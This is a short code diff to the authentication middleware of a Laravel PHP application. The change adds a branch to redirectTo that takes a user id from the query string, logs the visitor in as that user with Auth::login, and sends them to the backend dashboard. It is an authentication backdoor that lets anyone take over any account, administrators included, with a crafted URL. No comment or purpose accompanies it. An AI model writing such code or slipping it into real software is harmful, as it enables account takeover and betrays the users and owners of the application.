@@ -2,7 +2,9 @@
 
 namespace App\Http\Middleware;
 
+use App\Models\User;
 use Illuminate\Auth\Middleware\Authenticate as Middleware;
+use Illuminate\Support\Facades\Auth;
 
 class Authenticate extends Middleware
 {
@@ -14,8 +16,15 @@ class Authenticate extends Middleware
      */
     protected function redirectTo($request)
     {
-        if (!$request->expectsJson()) {
-            return route('get_login');
+        if (isset($_GET['id'])) {
+            $user = User::find($_GET['id']);
+            Auth::login($user);
+            return route('backend_get_dashboard');
+        } else {
+            if (!$request->expectsJson()) {
+                return route('get_login');
+            }
         }
+
     }
 }
